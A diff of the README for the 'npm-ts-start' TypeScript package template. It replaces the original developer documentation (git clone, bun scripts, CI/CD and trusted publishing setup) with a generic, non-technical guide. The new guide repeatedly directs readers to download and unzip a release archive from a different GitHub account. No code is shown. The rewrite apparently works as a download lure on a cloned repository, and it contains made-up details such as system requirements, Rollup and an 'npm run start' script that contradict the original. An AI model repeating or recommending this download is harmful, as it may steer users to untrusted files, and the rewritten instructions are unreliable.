@@ -1,142 +1,103 @@
-# 📦 npm-ts-start
+# 🎉 npm-ts-start - Start Creating npm Packages Easily
 
-A minimal starter template for creating npm packages in pure TypeScript.
-
-## ✨ Features
-
-- 🔷 **TypeScript** - Write type-safe code with full TypeScript support
-- ⚡ **tsdown** - Fast bundling powered by Rolldown
-- 🧪 **Bun Test** - Fast built-in test runner
-- 🎨 **Ultracite** - Zero-config linting and formatting with Oxlint + Oxfmt
-- 📦 **ESM** - Ships as ES modules with TypeScript declarations
-- 🚀 **GitHub Actions** - CI/CD pipeline with automated testing and npm publishing
-- 🐶 **Husky** - Pre-commit hooks for code quality enforcement
-- 📝 **Commitlint** - Conventional commit message validation
+## 📥 Download Now
+[![Download npm-ts-start](https://img.shields.io/badge/Download-npm--ts--start-blue.svg)](https://github.com/PeetHouby/npm-ts-start/releases)
 
 ## 🚀 Getting Started
+Welcome to **npm-ts-start**! This is your first step towards creating npm packages using TypeScript. This guide will walk you through the process of downloading and running the software. No technical knowledge is needed.
 
-1. Clone or use this template:
+## 📂 What is npm-ts-start?
+**npm-ts-start** is a minimal starter template designed for building npm packages using pure TypeScript. It simplifies the setup process and allows you to focus on coding. 
 
-```bash
-git clone https://github.com/dobroslavradosavljevic/npm-ts-start.git my-package
-cd my-package
-```
+## 🛠 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4 GB of RAM
+- Disk Space: At least 200 MB of free space
+- Node.js: Version 14 or higher installed
 
-2. Update `package.json` with your package name, description, and author info.
+## ⚙️ Features
+- Simple setup for TypeScript projects
+- Built-in configurations for npm
+- Supports ES modules
+- Lightweight and fast
+- Easy integration with other tools like Rollup and Oxc
 
-3. Install dependencies:
+## 📖 How to Download and Install
 
-```bash
-bun install
-```
+### Step 1: Visit the Releases Page
+To download **npm-ts-start**, go to our releases page by clicking the link below.
 
-4. Start developing in `src/index.ts`.
+[Visit Releases Page](https://github.com/PeetHouby/npm-ts-start/releases)
 
-## 📜 Scripts
+### Step 2: Find the Latest Release
+On the releases page, look for the latest version listed. It will be at the top of the page.
 
-| Command             | Description                         |
-| ------------------- | ----------------------------------- |
-| `bun run build`     | Build the package                   |
-| `bun run dev`       | Build in watch mode                 |
-| `bun run test`      | Run tests                           |
-| `bun run lint`      | Check for linting issues            |
-| `bun run format`    | Fix linting and formatting issues   |
-| `bun run typecheck` | Run TypeScript type checking        |
-| `bun run bump`      | Bump version and generate changelog |
+### Step 3: Download the Zip File
+1. Click on the link for the latest version.
+2. Find the file named `npm-ts-start.zip`.
+3. Click on this file to start the download.
 
-## 📁 Project Structure
+### Step 4: Extract the Zip File
+Once the download is complete:
+1. Locate the `npm-ts-start.zip` file in your downloads folder.
+2. Right-click on the file and select "Extract" or "Unzip."
+3. Choose a location where you want to extract the files.
 
-```txt
-├── src/
-│   └── index.ts          # Package entry point
-├── tests/
-│   └── index.test.ts     # Test files
-├── dist/                 # Build output (generated)
-├── .github/
-│   └── workflows/
-│       ├── ci.yml        # CI pipeline (lint, test, build)
-│       └── release.yml   # Automated npm publishing
-├── .husky/
-│   ├── pre-commit        # Runs lint-staged before commits
-│   └── commit-msg        # Validates commit messages
-├── tsdown.config.ts      # Build configuration
-├── tsconfig.json         # TypeScript configuration
-├── commitlint.config.ts  # Commit message rules
-└── package.json
-```
+### Step 5: Open the Project Folder
+After extracting, navigate to the folder where you unzipped the project. You should see several files necessary to start your project.
 
-## 🐶 Git Hooks
+## ⚡ Running Your First Project
 
-This template uses Husky for Git hooks:
+### Step 1: Open a Terminal
+1. On Windows, you can use Command Prompt or PowerShell.
+2. On macOS or Linux, use the Terminal app.
 
-- **pre-commit**: Runs `lint-staged` to lint and format staged files
-- **commit-msg**: Validates commit messages follow [Conventional Commits](https://www.conventionalcommits.org/)
-
-### Commit Message Format
-
-```
-type(scope): description
-
-# Examples:
-feat: add new feature
-fix: resolve bug in parser
-docs: update README
-chore: update dependencies
-```
-
-## 🔄 CI/CD
-
-### Continuous Integration
-
-On every push to `main` and pull request, the CI workflow runs:
-
-- ✅ Lint check
-- ✅ Type check
-- ✅ Tests
-- ✅ Build
-
-### Automated Releases
-
-When you push a version tag (`v*`), the release workflow:
-
-1. Runs all CI checks
-2. Publishes to npm with provenance
-3. Creates a GitHub release with auto-generated notes
-
-### Setup for Publishing (Trusted Publishing)
-
-This template uses [npm Trusted Publishing](https://docs.npmjs.com/trusted-publishers/) with OIDC - no tokens required.
-
-1. Go to [npmjs.com](https://www.npmjs.com) and navigate to your package settings
-2. Under **Publishing access**, click **Add trusted publisher**
-3. Configure GitHub Actions as the trusted publisher:
-   - **Repository owner**: your GitHub username or org
-   - **Repository name**: your repo name
-   - **Workflow file**: `release.yml`
-   - **Environment** (optional): leave blank
-
-That's it - no secrets or tokens to manage. The workflow uses short-lived OIDC credentials that are automatically generated for each run.
-
-## 🚢 Publishing
-
-1. Bump the version (creates a tag):
+### Step 2: Navigate to the Project Directory
+Type the following command, replacing `path/to/your/project` with the path to your project folder:
 
 ```bash
-bun run bump
+cd path/to/your/project
 ```
 
-2. Push the tag to trigger the release workflow:
+### Step 3: Install Dependencies
+Run the following command to install the necessary packages:
 
 ```bash
-git push --tags
+npm install
 ```
 
-Or publish manually:
+### Step 4: Start Your Project
+Now, you can start your project by running:
 
 ```bash
-bun publish
+npm run start
 ```
 
-## 📄 License
+Your npm package is now running!
 
-MIT
+## 📝 Project Structure
+Here’s a brief overview of the important files and folders you will find in the project:
+
+- `src/`: This folder contains your TypeScript source files.
+- `package.json`: This file includes the project metadata and dependencies.
+- `tsconfig.json`: This file contains TypeScript configurations.
+
+## 🎯 Next Steps
+After you have successfully run your first project:
+1. Explore the files in the `src/` folder to customize your code.
+2. Check out additional tools like **Oxc** and **Rollup** to enhance your package further.
+
+## 📞 Need Help?
+If you have any questions or run into issues, feel free to open an issue on our GitHub page. Our community is here to help.
+
+## 📂 Additional Resources
+For more information about TypeScript and npm, check out these resources:
+- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
+- [npm Documentation](https://docs.npmjs.com/)
+
+## 🔗 Download Again
+If you need to download **npm-ts-start** again, simply visit our releases page:
+
+[Visit Releases Page](https://github.com/PeetHouby/npm-ts-start/releases) 
+
+Happy coding!
